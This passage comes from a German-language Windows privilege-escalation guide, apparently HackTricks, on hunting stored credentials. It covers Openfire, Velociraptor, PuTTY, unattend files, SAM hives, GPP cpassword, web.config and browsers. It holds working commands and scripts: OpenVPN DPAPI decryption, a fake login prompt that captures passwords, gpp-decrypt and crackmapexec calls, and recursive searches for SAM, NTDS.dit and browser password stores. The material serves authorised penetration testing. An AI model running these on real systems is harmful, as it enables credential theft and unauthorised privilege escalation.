ohne Geheimnisse in routinemäßigen Enumerierungsausgaben auszugeben. Ein Patch-Pfad, ein verschlüsselter Wert oder ein Schlüsselverweis allein beweist weder gültige Anmeldedaten noch Zugriff mit höheren Rechten. Beschränken Sie die ACLs des Datenverzeichnisses und vermeiden Sie es, Geheimnisse in Build-Änderungen aufzunehmen.

### Benutzerdefinierte Rotation lokaler Administratorkennwörter

Ein selbst entwickelter Kennwortrotator kann ein verschlüsseltes Kennwort für den lokalen Administrator in einem lokalen Dienst speichern und die Zugangsdaten für den Datenspeicher in einer lesbaren `.env`-Datei oder neben der Updater-Binärdatei aufbewahren. Prüfen Sie gemeinsam den geplanten Task des Updaters, das Konto, die ACLs der Konfiguration, den Listener und die Berechtigungen des Datenspeichers. Ein ausschließlich an loopback gebundener Datenspeicher ist für einen lokalen Benutzer mit gültigen Anmeldedaten weiterhin erreichbar; die Authentifizierung allein beweist jedoch nicht, dass dieser Benutzer die relevanten Datensätze lesen darf. Wenn der Verschlüsselungs-Seed oder Schlüsselmaterial neben dem Chiffretext zugänglich ist, prüfen Sie die genaue Schlüsselableitung, bevor Sie der Verschlüsselung vertrauen. Ein Verfahren, das deterministisch einen AES-Schlüssel aus einem offengelegten Seed mit Go [`math/rand`](https://pkg.go.dev/math/rand) ableitet, ist zum Schutz dieses Kennworts ungeeignet; Go weist darauf hin, dass dieses Paket für sicherheitskritische Zufallswerte nicht geeignet ist. Vergewissern Sie sich, dass ein wiederhergestelltes Kennwort aktuell ist und zu einem Konto in der lokalen Gruppe „Administratoren“ gehört, bevor Sie es als möglichen Privilegieneskalationspfad betrachten. Ein geplanter Task, ein `.env`-Pfad oder ein verschlüsselter Blob allein belegt keine dieser Bedingungen. Geben Sie Passwörter und Schlüsselmaterial nicht in routinemäßigen Enumerierungsausgaben aus.

Verwenden Sie [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) für verwaltete lokale Administratorkennwörter. Dessen Verzeichnis- oder Entra-gestützter Speicher und die zugehörigen Zugriffskontrollen unterscheiden sich von einem benutzerdefinierten lokalen Datenspeicher; [Elasticsearch-Rollen](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) entscheiden ebenfalls, ob ein authentifizierter Datenspeicherbenutzer einen bestimmten Index lesen kann.

### Java-Server-Plugin-Archive und Wiederverwendung von Anmeldedaten

Einige Java-Server-Plugins werden als JAR-Archive im `plugins`-Verzeichnis eines Servers verteilt. Ein lesbares benutzerdefiniertes Plugin kann Konfiguration oder Bytecode mit eingebetteten Dienstanmeldedaten enthalten. Prüfen Sie das Archiv nur mit entsprechender Autorisierung und geben Sie wiederhergestellte Geheimnisse nicht in routinemäßigen Enumerierungsausgaben aus. Ein Plugin-Pfad allein beweist nicht, dass ein Geheimnis vorhanden ist. Ein wiederhergestelltes Dienstkennwort führt nur dann zu höheren Rechten, wenn es auch für ein privilegierteres Konto gültig ist. Prüfen Sie die ACLs der relevanten Dateien und ersetzen Sie wiederverwendete Anmeldedaten durch separate Geheimnisse. Informationen zum Verzeichnislayout finden Sie in der [Plugin-Installationsanleitung von PaperMC](https://docs.papermc.io/paper/adding-plugins/) und zu den Inhalten von Archiven in der [JAR-Dokumentation von Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Anmeldedaten der eingebetteten Openfire-Datenbank

Eine Openfire-Installation mit eingebetteter Datenbank kann `openfire.script` unter `Openfire\embedded-db` speichern. Wenn das aktuelle Konto die Datei lesen kann, prüfen Sie gemeinsam die `OFUSER`-Datensätze und die Eigenschaft `passwordKey`. Laut der [Dokumentation zum User-Provider von Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) können Passwörter im Klartext oder mit einem Schlüssel verschlüsselt gespeichert werden, der in dieser Eigenschaft hinterlegt ist. Ein wiederhergestelltes Passwort ist für eine Privilegieneskalation nur relevant, wenn es noch für eine privilegiertere Identität gültig ist; der Dateiname allein beweist weder Lesezugriff noch die Wiederverwendung von Anmeldedaten. Der Pfad ist ein Hinweis für die Bestandsaufnahme; geben Sie Datenbankinhalte und Anmeldedaten nicht in routinemäßigen Enumerierungsausgaben aus.

Die separate Datei `Openfire\conf\openfire.xml` kann die konfigurierten Ports und die Bind-Schnittstelle der Admin-Konsole offenlegen, selbst wenn eine externe Datenbank verwendet wird. Openfire bindet seine Admin-Konsole häufig an loopback. Ein lokales Konto kann die Adresse dennoch erreichen, sofern der Listener aktiv ist. Prüfen Sie gemeinsam den tatsächlichen Listener, die autorisierte Admin-Rolle, die Richtlinie für das Hochladen von Plugins und die Identität des Openfire-Dienstes. Ein Administrator, der ein Plugin installieren kann, kann möglicherweise Plugin-Code im Kontext des Dienstes ausführen lassen. Das kann hochprivilegiert sein, wenn der Dienst als LocalSystem ausgeführt wird. Ein übereinstimmendes Kontokennwort oder ein lesbarer Konfigurationspfad allein beweist weder Zugriff auf die Admin-Konsole noch Codeausführung. Siehe die [Installations- und Plugin-Verwaltungsanleitung des Herstellers](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) und die [API-Eigenschaft zum Hochladen von Plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguration des Forensik-Managementservers

Velociraptor-Serverkonfigurationen, die üblicherweise `server.config.yaml` heißen, können `CA.private_key` der internen CA enthalten. Wenn ein Benutzer mit niedrigeren Rechten diesen Schlüssel lesen kann, kann er möglicherweise ein API-Clientzertifikat ausstellen. Ob daraus höhere Rechte entstehen, hängt von den Benutzerrollen des Servers, der Erreichbarkeit der API und der Identität ab, unter der der Server oder der Ziel-Agent ausgeführt wird. Eine Clientkonfiguration enthält andere Informationen; ihr Vorhandensein belegt keinen Zugriff auf die Server-CA. In manchen Bereitstellungen wird der private CA-Schlüssel offline aufbewahrt, sodass die lesbare Serverkonfiguration möglicherweise keinen Signaturschlüssel enthält.

Prüfen Sie auf einem Windows-Server die ACL der **Server**-Konfiguration in dessen Installationsverzeichnis und aller geschützten Sicherungskopien. Ein möglicher Speicherort ist `%ProgramFiles%\VelociraptorServer\server.config.yaml`; verwenden Sie den für den Dienst konfigurierten Pfad, falls dieser abweicht. Vergewissern Sie sich, dass die aktuelle Identität die Datei lesen kann und `CA.private_key` tatsächlich vorhanden ist. Geben Sie den privaten Schlüssel nicht in Protokollen oder Enumerierungsausgaben aus. Der Workflow `config api_client` des Herstellers verwendet den CA-Schlüssel, um ein Clientzertifikat auszustellen. Dafür ist jedoch auch eine wirksame serverseitige Rolle erforderlich; deren Erstellung oder Änderung kann Schreibzugriff auf den Datenspeicher oder einen Neustart erfordern. Eine bereits vorhandene privilegierte Serveridentität kann einen möglichen Pfad eröffnen, selbst wenn diese Schreibzugriffe nicht verfügbar sind. API-Abfragen mit Ausführungsrechten laufen im jeweiligen Server- oder Agent-Kontext, der hochprivilegiert sein kann.

Schützen Sie die Serverkonfiguration und Sicherungskopien mit restriktiven ACLs, bewahren Sie den CA-Signaturschlüssel nach Möglichkeit offline auf und beschränken Sie API-Rollen und Listener-Zugriff. Siehe die [Velociraptor-API-Dokumentation](https://docs.velociraptor.app/docs/server_automation/server_api/) und die [Anleitung zur Sicherheitskonfiguration](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ist ein separater Sitzungsmanager. Sein nativer verschlüsselter Speicher kann sich unter `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` befinden, während eine exportierte Sitzungssicherung `sessions-backup.dat` heißen und an einem anderen Ort gespeichert sein kann. [SolarWinds' Anleitung zum Export](https://thwack.solarwinds.com/discussion/comment/115591) besagt, dass Exporte passwortverschlüsselt sind und Sitzungen, Schlüssel, Skripte, Tags und Beziehungen enthalten können; im [Supportforum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wird der native Speicherort genannt. Prüfen Sie zuerst die Dateiberechtigungen und Pfade. Das Auffinden einer der beiden Dateien verrät weder das Passwort noch belegt es, dass gespeicherte Zugangsdaten noch gültig sind oder höhere Berechtigungen besitzen.

### PuTTY-SSH-Hostschlüssel

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-Schlüssel in der Registry

SSH-Privatschlüssel können im Registrierungsschlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein. Daher solltest du prüfen, ob sich dort etwas Interessantes befindet:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Wenn du einen Eintrag in diesem Pfad findest, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt gespeichert, kann aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsselt werden.\
Weitere Informationen zu dieser Technik findest du hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Wenn der `ssh-agent`-Dienst nicht ausgeführt wird und du möchtest, dass er beim Systemstart automatisch gestartet wird, führe Folgendes aus:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per SSH bei einem Computer anzumelden. Der Registrierungsschlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht, und Procmon hat während der Authentifizierung mit asymmetrischen Schlüsseln keine Verwendung von `dpapi.dll` festgestellt.

### Unbeaufsichtigte Dateien

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Du kannst auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM- und SYSTEM-Sicherungen

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Lesbare Windows-Imaging-Sicherungsdateien (`.wim`) können auch offline gespeicherte `SAM`-, `SECURITY`- und `SYSTEM`-Hives enthalten. Prüfe vorrangig lokal zugängliche Sicherungs- oder Imageverzeichnisse und untersuche die **Namen der enthaltenen Elemente**, bevor du etwas extrahierst. Allein ein `.wim`-Dateiname beweist nicht, dass Hives offengelegt werden; gängige `install.wim`-, `boot.wim`- und Recovery-Images sind häufige Irrwege. Eine SMB-Freigabe ist ein separater Zugriffsweg und sollte nur geprüft werden, wenn sie zum Scope gehört. Siehe Microsofts [Anleitungen zu Windows-Images](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) und die [Referenz zu Registry-Hive-Dateien](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud-Zugangsdaten

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher gab es eine Funktion, mit der über Group Policy Preferences (GPP) benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Computern eingerichtet werden konnten. Diese Methode wies jedoch erhebliche Sicherheitsmängel auf. Erstens konnten alle Domänenbenutzer auf die Group Policy Objects (GPOs) zugreifen, die als XML-Dateien in SYSVOL gespeichert waren. Zweitens konnten alle authentifizierten Benutzer die Passwörter in diesen GPPs entschlüsseln, da sie mit AES256 und einem öffentlich dokumentierten Standardschlüssel verschlüsselt waren. Dies stellte ein erhebliches Risiko dar, da Benutzer dadurch erhöhte Berechtigungen erlangen konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die lokal zwischengespeicherte GPP-Dateien nach einem nicht leeren Feld „cpassword“ durchsucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei und hilft so dabei, diese Sicherheitslücke zu identifizieren und zu beheben.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**So entschlüsselst du das cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

CrackMapExec verwenden, um Passwörter zu erhalten:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS-Webkonfiguration

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Beispiel für eine web.config mit Zugangsdaten:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup-Archive in einem IIS-Webroot

Ein altes ZIP-Backup, das direkt in einem über HTTP bereitgestellten Webroot liegt, kann frühere Konfigurationsdateien und wiederverwendbare Zugangsdaten offenlegen. Prüfe den konfigurierten physischen Pfad der Website und ob das Archiv tatsächlich über HTTP erreichbar ist, bevor du es als offengelegt einstufst. Der Standardpfad `C:\inetpub\wwwroot` ist lediglich ein möglicher Kandidat. Eine schnelle lokale Bestandsaufnahme kann Namen und Größen auflisten, ohne die Archive zu öffnen:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Der Name eines Archivs beweist weder, dass es ein Geheimnis enthält, noch, dass wiederhergestellte Zugangsdaten höhere Berechtigungen gewähren.

### OpenVPN-Zugangsdaten

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Protokolle

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Nach Anmeldedaten fragen

Sie können den Benutzer jederzeit auffordern, seine Anmeldedaten oder sogar die eines anderen Benutzers einzugeben, wenn Sie glauben, dass er sie kennt (beachten Sie, dass es wirklich **riskant** ist, den Client direkt nach den **Anmeldedaten** zu fragen):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mögliche Dateinamen mit Zugangsdaten**

Bekannte Dateien, die früher einmal **Passwörter** im **Klartext** oder in **Base64** enthielten

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3-Datenbanken verwenden häufig die Erweiterung `.psafe3`. Betrachte einen passenden Dateinamen als möglichen verschlüsselten Tresor; sein Vorhandensein belegt nicht, dass du ihn lesen, entsperren oder gespeicherte Anmeldedaten verwenden kannst. Prüfe bei der Überprüfung der Speicherorte solcher Dateien zugängliche Benutzerprofile und konfigurierte Freigabewurzeln.

Eine lesbare KeePass-`.kdbx`-Datei ist ebenfalls nur ein Hinweis auf einen verschlüsselten Tresor. Zum Entsperren benötigst du das tatsächliche Master-Passwort sowie gegebenenfalls konfigurierte Schlüsseldaten oder Kontofaktoren. Falls eine autorisierte Überprüfung ein LM:NT-Hashpaar in einem Eintrag findet, überprüfe das angegebene Konto und ob der NT-Hash aktuell ist und vom NTLM-Dienst des Ziels akzeptiert wird, bevor du [pass-the-hash](../ntlm/README.md#pass-the-hash) in Betracht ziehst. Ein Tresoreintrag verleiht für sich allein keine Administrator- oder SYSTEM-Rechte; auch der Remote-Dienstzugriff, die Kontoberechtigungen und alle separaten Schritte zur Dienstausführung müssen gegeben sein. Bei der Bestandsaufnahme sollten Tresorpfad und Lesbarkeit erfasst werden, nicht die Datenbank oder gespeicherte Anmeldedaten ausgegeben werden.

Durchsuche alle vorgeschlagenen Dateien:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Zugangsdaten im Papierkorb

Prüfe zugängliche Einträge im Papierkorb auf gelöschte Backups und Konfigurationsarchive sowie auf Dateien, deren Namen ausdrücklich auf Zugangsdaten hinweisen. Ein nützliches `.7z`-, `.zip`- oder `.rar`-Backup kann Monate alt sein und einen gewöhnlichen Dateinamen haben. Windows speichert den ursprünglichen Pfad und den Löschzeitpunkt in einem `$I`-Datensatz und die gelöschte Datei als zugehörigen `$R`-Eintrag; prüfe die Metadaten und den Lesezugriff der aktuellen Identität, bevor du ein Archiv öffnest. Die Sichtbarkeit hängt vom Volume, der Benutzer-SID und den Dateiberechtigungen ab. Eine leere Liste beweist daher nicht, dass kein wiederherstellbares Backup vorhanden ist. Betrachte den Namen eines Archivs als Kandidaten für eine Prüfung, nicht als Beweis dafür, dass es ein gültiges Geheimnis enthält.

Eine zugängliche gelöschte `.pfx`-Datei kann auch ein Hinweis auf **Code-Signing** sein. Wenn sie einen zugänglichen privaten Schlüssel enthält, kann dieser ein geändertes PowerShell-Skript signieren; [PowerShell erfordert ein Code-Signing-Zertifikat mit privatem Schlüssel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), und [AppLocker-Publisherregeln prüfen die Identität des Signierers und den Geltungsbereich der Regel](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Für die Ausführung unter einem anderen Konto muss die aktuelle Identität das konkrete Skript ändern können, eine wirksame Regel die resultierende Signatur für das Skript und das Zielkonto akzeptieren und ein geplanter Task oder ein anderer Prozess mit höheren Berechtigungen das Skript tatsächlich ausführen. Ein `.pfx`-Dateiname, der Zertifikatsbetreff oder ein beschreibbares Skript allein belegen diese Voraussetzungen nicht. Prüfe Metadaten, ACLs, Richtlinien und den geplanten Befehl, bevor du Material mit privaten Schlüsseln öffnest oder den Task auslöst.

Prüfe außerdem zugängliche Profil-Datenbanken von Messaging-Clients, Notizen und empfangene Dateien auf Hinweise auf Zugangsdaten. Ein BitLocker-Wiederherstellungsschlüsselexport kann als HTML- oder TXT-Datei gespeichert sein, manchmal in einem benannten Backup-Archiv. Solches Material kann Zugriff auf ein separates verschlüsseltes Datenvolume mit älteren Backups ermöglichen; untersuche das Volume und das Archiv nur, wenn der Zugriff autorisiert ist. Wenn ein Backup `NTDS.dit` enthält, erfordert die Offline-Wiederherstellung von Domänenzugangsdaten außerdem den passenden `SYSTEM`-Hive, wie im [Workflow für Backups und privilegierte Gruppen](../active-directory-methodology/privileged-groups-and-token-privileges.md) beschrieben. Dateinamen und ein gesperrtes Volume allein belegen nicht, dass ein verwendbarer Wiederherstellungsschlüssel oder ein Domänenbackup vorhanden ist.

Zum **Wiederherstellen von Passwörtern**, die von mehreren Programmen gespeichert wurden, kannst du Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Schlüssel mit Zugangsdaten**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extrahieren von OpenSSH-Schlüsseln aus der Registrierung.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Prüfe, ob Datenbanken vorhanden sind, in denen Passwörter aus **Chrome, Edge oder Firefox** gespeichert sind.\
Prüfe auch den Verlauf, die Lesezeichen und Favoriten der Browser, da dort möglicherweise **Passwörter gespeichert sind**.

Beim herkömmlichen Edge-Profil **Default** des aktuellen Benutzers befindet sich `Login Data` unter `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, während `Local State` im übergeordneten Verzeichnis `User Data` liegt. [Microsoft dokumentiert den Standardpfad für Profile](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); ein anderes Profil oder eine `UserDataDir`-Richtlinie kann den Speicherort ändern. Das Vorhandensein der Dateien ist lediglich ein Hinweis auf einen möglichen Speicherort von Zugangsdaten: Prüfe, ob die Dateien lesbar sind, ob der DPAPI-Kontext des betreffenden Benutzers oder anderes autorisiertes Schlüsselmaterial verfügbar ist und ob ein gespeicherter Login zu einem privilegierteren Konto gehört. Eine reine Auflistung von Pfaden muss weder die Datenbank öffnen noch entschlüsselte Passwörter ausgeben.

Für Firefox dokumentiert [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), dass `key4.db` und `logins.json` eines Profils zusammengehörige Schlüssel- und verschlüsselte Login-Dateien sind. Ihr Vorhandensein ist lediglich ein Hinweis: Prüfe, ob beide Dateien lesbar sind, ob gespeicherte Einträge vorhanden sind und ob ein Primary Password den Schlüssel schützt, bevor du zu dem Schluss kommst, dass Zugangsdaten verwendet werden können. Gehört ein wiederhergestellter Zugang zu einem Domänenkonto, prüfe separat die effektiven Gruppenverwaltungsrechte dieses Kontos sowie die [LAPS-Berechtigungen zum Lesen oder Entschlüsseln von Passwörtern](../active-directory-methodology/laps.md) der Gruppe; Browser-Artefakte allein weisen keinen möglichen Pfad zu Administratorrechten nach.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/GhostPack/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine in das Windows-Betriebssystem integrierte Technologie, die die **Kommunikation** zwischen Softwarekomponenten verschiedener Sprachen ermöglicht. Jede COM-Komponente wird über eine **class ID (CLSID) identifiziert** und stellt ihre Funktionalität über eine oder mehrere Schnittstellen bereit, die durch interface IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind in der Registrierung unter **HKEY\CLASSES\ROOT\CLSID** beziehungsweise **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registrierung entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

In den CLSIDs dieser Registrierung findest du den untergeordneten Registrierungsschlüssel **InProcServer32**. Dieser enthält einen **Standardwert**, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single- oder Multi-Threaded) oder **Neutral** (Thread-neutral) sein kann.

![Browserverlauf - COM DLL Overwriting: In den CLSIDs dieser Registrierung findest du den untergeordneten Registrierungsschlüssel InProcServer32. Dieser enthält einen Standardwert, der auf eine DLL verweist, sowie einen Wert...](<../../images/image (729).png>)

Wenn du also **eine der DLLs überschreiben kannst**, die ausgeführt werden, könntest du **deine Privilegien erweitern**, falls diese DLL von einem anderen Benutzer ausgeführt wird.

Weitere Informationen dazu, wie Angreifer COM Hijacking als Persistenzmechanismus einsetzen, findest du hier:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Passwortsuche in Dateien und Registrierung**

**Dateiinhalte durchsuchen**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Nach einer Datei mit einem bestimmten Dateinamen suchen**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Durchsuchen Sie die Registry nach Schlüsselnamen und Passwörtern**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf-Plugin.** Ich habe dieses Plugin erstellt, um **automatisch jedes Metasploit-POST-Modul auszuführen, das im Opfer nach Zugangsdaten sucht**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die die auf dieser Seite erwähnten Passwörter enthalten.\
